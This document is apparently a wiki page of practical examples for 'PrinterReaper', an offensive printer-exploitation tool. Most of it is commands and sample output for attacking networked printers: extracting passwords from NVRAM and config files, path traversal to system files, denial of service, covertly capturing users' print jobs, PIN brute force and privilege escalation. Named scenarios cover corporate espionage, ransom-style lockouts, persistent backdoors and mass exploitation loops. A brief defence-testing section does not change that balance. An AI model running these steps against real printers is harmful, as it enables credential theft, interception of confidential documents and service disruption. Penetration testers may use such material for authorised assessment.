# 💡 Practical Examples

Real-world usage scenarios and attack examples for PrinterReaper.

---

## 🎯 Basic Usage Examples

### Example 1: Network Discovery

**Scenario**: Find all printers on your network

```bash
# Run discovery
$ python3 printer-reaper.py

Detected OS: Linux
Found 2 network(s) to consider:
  [1] 192.168.1.0/24 (254 hosts)
  [2] 10.0.0.0/24 (254 hosts)

Select networks to scan [e.g. 1,1-3,all]: 1,2
Verbose probing? [y/N]: y

Scanning 192.168.1.0/24...
  192.168.1.100: Printer → HP LaserJet 4250, uptime=10:21:49, status=Ready
  192.168.1.105: Printer → Brother MFC-7860DW, uptime=16:31:17, status=Sleep
  192.168.1.110: not a printer

Scanning 10.0.0.0/24...
  10.0.0.50: Printer → Epson WF-7720, uptime=3 days, status=Ready

Discovered printers:
192.168.1.100    HP LaserJet 4250       uptime=10:21:49    Ready
192.168.1.105    Brother MFC-7860DW    uptime=16:31:17    Sleep
10.0.0.50        Epson WF-7720         uptime=3 days      Ready
```

---

### Example 2: Basic Reconnaissance

**Scenario**: Gather information about a specific printer

```bash
# Connect
$ python3 printer-reaper.py 192.168.1.100 pjl

# Get identification
192.168.1.100:/> id

PJL Printer Identification:
Device ID: HP LaserJet 4250
Firmware: Version 20190604 3.9.8
Product: HP LaserJet 4250 Printer
Page Count: 123456

# Get network configuration
192.168.1.100:/> network

Network Configuration:
IP=192.168.1.100
SUBNET=255.255.255.0
GATEWAY=192.168.1.1
DHCP=ON
MAC=00:11:22:33:44:55

# List environment variables
192.168.1.100:/> variables

COPIES=1
DUPLEX=OFF
TIMEOUT=30
RESOLUTION=600
JOBMEDIA=LETTER
```

---

### Example 3: Filesystem Exploration

**Scenario**: Explore and map printer's filesystem

```bash
# List root directory
192.168.1.100:/> ls

d        -   0:
d        -   1:
-     1276   .profile
d        -   bin
d        -   dev
d        -   etc
d        -   webServer
d        -   tmp

# Explore etc directory
192.168.1.100:/> cd etc
192.168.1.100:/etc> ls

-      834   passwd
-      156   hosts
-     2048   config.xml
d        -   ssl

# Explore webServer
192.168.1.100:/> cd /webServer
192.168.1.100:/webServer> ls

-     4096   index.html
-     1024   status.xml
d        -   logs

# Find all files recursively
192.168.1.100:/> find

Found files:
0:/.profile
0:/bin/sh
0:/etc/passwd
0:/etc/hosts
0:/etc/config.xml
0:/webServer/index.html
0:/webServer/status.xml
0:/tmp/
```

---

## 🔓 Security Testing Examples

### Example 4: Password Extraction

**Scenario**: Extract passwords and credentials from printer

```bash
# Download passwd file
192.168.1.100:/> download /etc/passwd

Downloaded passwd to ./passwd

# View contents
$ cat passwd
root:x:0:0:root:/root:/bin/sh
admin:x:1000:1000:admin:/home/admin:/bin/sh

# Dump NVRAM (may contain passwords)
192.168.1.100:/> nvram dump

NVRAM Contents:
ADMIN_PASSWORD=secret123
WIFI_PSK=MyWiFiPass2024
SMTP_PASSWORD=email_pass
SNMP_COMMUNITY=private

# Download configuration
192.168.1.100:/> download /etc/config.xml

# Analyze locally
$ grep -i "password" config.xml
<AdminPassword>PlainTextPass123</AdminPassword>
<WiFiPassword>WPA2Key2024</WiFiPassword>
```

**Findings:**
- ✅ Passwords stored in plaintext
- ✅ Configuration accessible without authentication
- ✅ NVRAM contains credentials
- ✅ No encryption of sensitive data

---

### Example 5: Path Traversal Attack

**Scenario**: Exploit path traversal to access system files

```bash
# Test basic traversal
192.168.1.100:/> cd ../../../
192.168.1.100:/../../../> ls

d        -   bin
d        -   boot
d        -   etc
d        -   home
d        -   root
d        -   var

# Access sensitive files
192.168.1.100:/> download ../../../etc/passwd
192.168.1.100:/> download ../../rw/var/sys/passwd
192.168.1.100:/> download 0:/../../../etc/shadow

# Verify vulnerability
$ cat passwd
root:$6$encrypted_hash:0:0:root:/root:/bin/sh
```

**Impact:**
- Access to system files outside printer filesystem
- Potential privilege escalation
- Configuration file disclosure

---

### Example 6: Configuration Backup Attack

**Scenario**: Backup, modify, and restore configuration

```bash
# Step 1: Backup original configuration
192.168.1.100:/> backup original.bak

Configuration backed up to original.bak

# Step 2: Modify settings
192.168.1.100:/> set TIMEOUT=999
192.168.1.100:/> set COPIES=100
192.168.1.100:/> display "PWNED"

# Step 3: Verify changes
192.168.1.100:/> variables

TIMEOUT=999
COPIES=100

# Step 4: Restore if needed
192.168.1.100:/> restore original.bak
```

---

## 💥 Attack Examples

### Example 7: Print Job Capture

**Scenario**: Capture all print jobs for analysis

```bash
# Step 1: Enable job retention
192.168.1.100:/> hold

Job retention enabled

# Step 2: Enable capture mode
192.168.1.100:/> capture

Capture mode enabled. All jobs will be saved to exfiltrated/

# Step 3: Wait for print jobs
# (User sends print job from computer)

# Step 4: Check captured jobs
$ ls exfiltrated/
captured_job_001.ps
captured_job_002.pdf
captured_job_003.pcl

# Step 5: Analyze captured documents
$ file exfiltrated/captured_job_001.ps
exfiltrated/captured_job_001.ps: PostScript document text

$ strings exfiltrated/captured_job_001.ps | grep -i "confidential"
CONFIDENTIAL FINANCIAL REPORT Q4 2024
```

**Impact:**
- ✅ Confidential documents intercepted
- ✅ No user awareness
- ✅ Persistent attack
- ✅ Can capture multiple jobs

---

### Example 8: Denial of Service

**Scenario**: Make printer unavailable

```bash
# Method 1: Take offline
192.168.1.100:/> offline "System Maintenance - DO NOT USE"

Printer taken offline

# Method 2: Disable functionality
192.168.1.100:/> disable

Printer disabled

# Method 3: Lock with unknown PIN
192.168.1.100:/> lock 31337

Printer locked with PIN

# Method 4: Buffer overflow crash
192.168.1.100:/> flood 100000

Flooding with 100000 bytes...
# Printer may crash or hang

# Method 5: Connection exhaustion
192.168.1.100:/> dos_connections

Exhausting connection pool...
# Printer cannot accept new connections
```

**Impact:**
- Printer unavailable for legitimate users
- Service interruption
- May require manual intervention
- Can last indefinitely

---

### Example 9: Firmware Information Gathering

**Scenario**: Gather firmware details for CVE research

```bash
# Get comprehensive firmware info
192.168.1.100:/> firmware_info

Firmware Information:
Manufacturer: HP
Model: LaserJet 4250
Firmware Version: 20190604 3.9.8
Build Date: 2019-06-04
Engine Version: 3.9.8

# Get full configuration
192.168.1.100:/> info config

IN TRAYS [1 250 4 6 7]
IN SIZES [LETTER LEGAL A4 EXEC]
DUPLEX [ON OFF]
PERSONALITY [PCL POSTSCRIPT PJL]
RESOLUTION [600 1200]

# Check for known vulnerabilities
$ searchsploit "HP LaserJet 4250"
$ cve-search "HP LaserJet 4250 3.9.8"
```

---

### Example 10: Automated Testing

**Scenario**: Automate tests using command files

**Create test script** (`security_test.txt`):
```
# PrinterReaper automated security test
id
network
variables
ls
ls /etc
download /etc/passwd
download /etc/config.xml
nvram dump
permissions /etc/shadow
traverse
backup auto_backup.cfg
exit
```

**Execute:**
```bash
# Run automated test
$ python3 printer-reaper.py -i security_test.txt 192.168.1.100 pjl

# Results logged automatically
# Review downloaded files in current directory
$ ls
passwd
config.xml
auto_backup.cfg
```

---

## 🎓 Advanced Examples

### Example 11: Multi-Printer Assessment

**Scenario**: Test multiple printers efficiently

```bash
# Create target list
$ cat targets.txt
192.168.1.100
192.168.1.105
192.168.1.110
10.0.0.50

# Create test script
$ cat batch_test.txt
id
network
ls
download /etc/passwd
exit

# Test each printer
for ip in $(cat targets.txt); do
    echo "Testing $ip..."
    python3 printer-reaper.py -i batch_test.txt -q $ip pjl > "results_${ip}.txt" 2>&1
done

# Review results
$ grep -l "passwd" results_*.txt
results_192.168.1.100.txt
results_10.0.0.50.txt
```

---

### Example 12: Forensic Analysis

**Scenario**: Full forensic acquisition of printer

```bash
# Connect to printer
$ python3 printer-reaper.py 192.168.1.100 pjl

# Full information gathering
192.168.1.100:/> id > forensics/id_info.txt
192.168.1.100:/> network > forensics/network_info.txt
192.168.1.100:/> info config > forensics/config_info.txt
192.168.1.100:/> variables > forensics/variables.txt
192.168.1.100:/> nvram dump > forensics/nvram_dump.txt

# Full filesystem mirror
192.168.1.100:/> mirror

Mirroring filesystem...
Downloaded: 0:/.profile
Downloaded: 0:/etc/passwd
Downloaded: 0:/etc/hosts
Downloaded: 0:/etc/config.xml
...
Mirror complete!

# Backup configuration
192.168.1.100:/> backup forensics/printer_config.bak

# Create forensic report
$ tree forensics/
forensics/
├── id_info.txt
├── network_info.txt
├── config_info.txt
├── variables.txt
├── nvram_dump.txt
├── printer_config.bak
└── mirror/
    ├── etc/
    │   ├── passwd
    │   ├── hosts
    │   └── config.xml
    └── webServer/
        ├── index.html
        └── logs/
```

---

## 🛡️ Defense Testing Examples

### Example 13: Testing Security Controls

**Scenario**: Verify printer security controls are working

```bash
# Test 1: Lock mechanism
192.168.1.100:/> lock 12345
Printer locked with PIN

# Try operations without unlock
192.168.1.100:/> set TIMEOUT=999
Permission denied

# Unlock and test
192.168.1.100:/> unlock 12345
Printer unlocked

192.168.1.100:/> set TIMEOUT=999
Timeout set to 999 seconds

# Result: Lock mechanism WORKING ✅
```

**Test 2: Path Restrictions**
```bash
# Try path traversal
192.168.1.100:/> download ../../../etc/shadow
Permission denied

# Try volume escape
192.168.1.100:/> download 0:/../../../etc/passwd
Permission denied

# Result: Path restrictions WORKING ✅
```

---

## 📊 Performance Testing Examples

### Example 14: Stress Testing

```bash
# Upload large file
192.168.1.100:/> upload large_file.dat

# Flood test
192.168.1.100:/> flood 1000000

# Connection stress
for i in {1..100}; do
    python3 printer-reaper.py -q 192.168.1.100 pjl -c "id" &
done
```

---

## 🎯 Practical Attack Scenarios

### Scenario 1: Corporate Espionage

**Objective**: Capture confidential documents

```bash
# 1. Identify target printer (conference room MFP)
$ python3 printer-reaper.py 192.168.10.50 pjl

# 2. Enable job retention
> hold
> capture

# 3. Wait for documents to be printed
# (Employees print confidential documents)

# 4. Collect captured jobs
$ ls exfiltrated/
board_meeting_minutes.pdf
salary_report_q4.xlsx
merger_proposal.docx

# 5. Clean up
> backdoor_remove
> exit
```

---

### Scenario 2: Ransomware Simulation

**Objective**: Simulate printer ransomware attack

```bash
# 1. Connect
$ python3 printer-reaper.py 192.168.1.100 pjl

# 2. Lock printer
> lock 31337

# 3. Display ransom message
> display "LOCKED! Contact admin@company.com"

# 4. Take offline
> offline "Printer Encrypted - Pay Ransom"

# 5. (For testing) Unlock
> unlock 31337
```

---

### Scenario 3: Persistent Backdoor

**Objective**: Install persistent backdoor

```bash
# 1. Upload backdoor script
> upload backdoor.ps /webServer/maintenance.ps

# 2. Verify persistence across reboots
> restart
# Wait for restart...
> reconnect
> ls /webServer
-  1024  maintenance.ps  # Still there!

# 3. Execute backdoor
> execute @PJL ENTER LANGUAGE=POSTSCRIPT
> execute (maintenance.ps) run

# 4. Remove backdoor
> backdoor_remove
```

---

### Scenario 4: Data Exfiltration

**Objective**: Exfiltrate all accessible data

```bash
# 1. Mirror entire filesystem
> mirror

Mirroring 0:/
Downloaded: .profile (1276 bytes)
Downloaded: etc/passwd (834 bytes)
Downloaded: etc/hosts (156 bytes)
Downloaded: etc/config.xml (2048 bytes)
...
Total: 156 files, 4.2 MB

# 2. Download NVRAM
> nvram dump > nvram_contents.txt

# 3. Backup configuration
> backup printer_full_backup.cfg

# 4. Get network credentials
> download /etc/network/wireless.cfg
> download /etc/smtp/credentials.txt

# 5. Package for exfiltration
$ tar -czf printer_data.tar.gz exfiltrated/ nvram_contents.txt *.cfg
$ ls -lh printer_data.tar.gz
-rw-r--r-- 1 user user 2.1M Oct 04 13:00 printer_data.tar.gz
```

---

## 🔬 Vulnerability Testing Examples

### Example 15: Buffer Overflow Detection

```bash
# Test with increasing sizes
192.168.1.100:/> flood 1000
Flooding with 1000 bytes...
[Printer responds normally]

192.168.1.100:/> flood 10000
Flooding with 10000 bytes...
[Printer responds normally]

192.168.1.100:/> flood 50000
Flooding with 50000 bytes...
[Printer hangs - VULNERABLE!]

# Document vulnerability
# - Printer hangs at ~50000 bytes
# - Potential buffer overflow
# - CVE research recommended
```

---

### Example 16: Authentication Bypass

```bash
# Test 1: No authentication required
192.168.1.100:/> ls /etc
[Success - NO AUTH REQUIRED]

# Test 2: Lock bypass
192.168.1.100:/> lock 12345
192.168.1.100:/> unlock 0
[Success - LOCK BYPASSED]

# Test 3: Default credentials
192.168.1.100:/> unlock 0
192.168.1.100:/> unlock 1234
192.168.1.100:/> unlock admin
[One works - DEFAULT CREDS]

# Test 4: Brute force
192.168.1.100:/> unlock_bruteforce
Testing PIN 1...
Testing PIN 2...
...
Success at PIN 4567!
```

---

### Example 17: Privilege Escalation

```bash
# Scenario: Gain admin access via filesystem

# 1. Check current permissions
192.168.1.100:/> permissions /etc/passwd
File /etc/passwd is accessible

# 2. Download admin config
192.168.1.100:/> download /etc/admin.cfg

# 3. Modify and upload
$ sed -i 's/USER_LEVEL=1/USER_LEVEL=0/' admin.cfg

192.168.1.100:/> upload admin.cfg /etc/admin.cfg

# 4. Restart to apply
192.168.1.100:/> restart

# 5. Verify escalation
192.168.1.100:/> id
Device ID: HP LaserJet 4250 [ADMIN MODE]
```

---

## 📋 Batch Testing Examples

### Example 18: Automated Vulnerability Scan

**Create scan script** (`vuln_scan.txt`):
```
# Comprehensive vulnerability scan
id
network
variables

# Test filesystem access
ls
ls /etc
ls /etc/passwd
find

# Test path traversal
download ../../../etc/passwd
download ../../rw/var/sys/passwd
download 0:/../../../etc/shadow

# Test write access
touch /tmp/vuln_test.txt
upload test.txt /tmp/test.txt
delete /tmp/test.txt

# Test permissions
permissions /etc/passwd
permissions /etc/shadow
chmod 777 /etc/test

# Test information disclosure
nvram dump
download /etc/config.xml

# Test DoS vectors
flood 1000
flood 10000

# Cleanup and exit
backup vuln_scan_backup.cfg
exit
```

**Execute:**
```bash
$ python3 printer-reaper.py -i vuln_scan.txt 192.168.1.100 pjl | tee scan_results.log
```

---

### Example 19: Mass Exploitation

**Scenario**: Exploit multiple printers

```bash
# Create exploit script
$ cat mass_exploit.txt
id
lock 31337
display "PRINTER HACKED - SECURITY TEAM NOTIFIED"
offline "Under Investigation - Do Not Use"
download /etc/passwd
nvram dump
backup exploitation_backup.cfg
exit

# Run against all discovered printers
$ for ip in 192.168.1.100 192.168.1.105 10.0.0.50; do
    echo "Exploiting $ip..."
    python3 printer-reaper.py -i mass_exploit.txt $ip pjl
done

# Results collected in current directory
$ ls
passwd_192.168.1.100
passwd_192.168.1.105
passwd_10.0.0.50
nvram_dump_*.txt
exploitation_backup_*.cfg
```

---

## 🧪 Testing Best Practices

### Safe Testing Protocol

```bash
# 1. Always backup first
> backup pre_test_backup.cfg

# 2. Test non-destructive commands first
> id
> ls
> network

# 3. Test read operations before write
> download /etc/passwd    # Before upload
> cat /etc/hosts          # Before modify

# 4. Use safe mode
$ python3 printer-reaper.py --safe <target> pjl

# 5. Clean up after testing
> pjl_delete /tmp/test_files
> unlock 0
> display ""
> restore pre_test_backup.cfg
> exit
```

---

## 📚 More Examples

For more scenarios:
- **[Security Testing](Security-Testing)** - Systematic testing workflows
- **[Attack Vectors](Attack-Vectors)** - Detailed exploitation techniques
- **[PJL Commands](PJL-Commands)** - Command reference

---

<div align="center">

**Practical Examples**  
Real-world scenarios for security testing and research

**→ [Next: FAQ](FAQ)**

</div>

